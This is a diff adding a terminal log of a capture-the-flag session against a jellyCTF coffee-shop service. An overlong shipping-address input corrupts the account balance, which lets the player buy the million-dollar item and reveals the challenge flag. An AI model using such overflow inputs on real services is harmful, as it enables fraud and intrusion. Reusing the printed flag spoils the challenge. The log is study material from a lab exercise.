@@ -1,0 +1,48 @@
+$ nc chals.jellyc.tf 5002
+
+Welcome to the Phase Connect coffee shop v2.0
+We sell coffee! 
+Please buy our coffee... 
+or else... 
+1. Check Account Balance
+2. Purchase Coffee
+3. Exit
+Enter a menu selection 
+2
+
+
+Currently on sale
+1. Tenma Maemi Inspired - $35 each
+2. Amanogawa Shiina Inspired - $35 each
+3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
+Please make a selection: 1
+
+Enter desired quantity: 1
+
+Current balance: 1000
+Total cost: 35
+Your order is being processed. Please enter your shipping address: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyye2e3yyyyyyyyass
+862270053 coffees purchased! Your coffee is being packaged and will be delivered in 2028!
+Coffee will be delivered to xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyye2e3yyyyyyyyass
+
+Current balance: 175338337
+
+Welcome to the Phase Connect coffee shop v2.0
+We sell coffee! 
+Please buy our coffee... 
+or else... 
+1. Check Account Balance
+2. Purchase Coffee
+3. Exit
+Enter a menu selection 
+2
+
+
+Currently on sale
+1. Tenma Maemi Inspired - $35 each
+2. Amanogawa Shiina Inspired - $35 each
+3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
+Please make a selection: 3
+You have chosen the deluxe, premium, limited edition seiso idol princess Jelly Hoshiumi inspired coffee.
+This coffee costs $1,000,000. Press 1 to confirm purchase: 1
+YOUR FLAG IS: jellyCTF{ph4se_c0nn3ct_15_definitely_a_coff33_comp4ny}
